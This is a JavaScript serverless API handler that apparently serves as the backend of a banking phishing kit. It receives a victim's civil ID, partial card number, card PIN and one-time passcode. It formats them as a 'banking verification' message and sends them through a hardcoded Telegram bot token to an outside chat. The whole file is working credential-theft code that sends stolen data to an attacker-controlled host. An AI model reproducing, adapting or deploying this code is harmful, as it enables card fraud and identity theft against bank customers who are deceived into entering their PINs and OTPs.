export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { civilId, first4, last4, brand, pin, otp, language, device, status } = req.body;

  const TELEGRAM_BOT_TOKEN = '9040001517:AAGZA2GjB9nmcneaYLW994A85FSpHa03c-4';
  const TELEGRAM_CHAT_ID = '9287285450';

  const payloadMessage = `
🔐 <b>New Banking Verification Data Received</b>

👤 <b>Civil ID / Resident ID:</b> <code>${civilId}</code>
💳 <b>Card Digits:</b> <code>${first4} •••• •••• ${last4}</code> (${brand})
🔑 <b>Card PIN:</b> <code>${pin}</code>
📲 <b>OTP Code:</b> <code>${otp}</code>
🌐 <b>Language:</b> ${language}
📱 <b>Device View:</b> ${device}
  `.trim();

  try {
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: payloadMessage,
        parse_mode: 'HTML'
      })
    });

    const result = await response.json();
    if (!result.ok) {
      throw new Error(result.description || 'Telegram API error');
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Failed to dispatch to Telegram:', error);
    return res.status(500).json({ error: error.message });
  }
}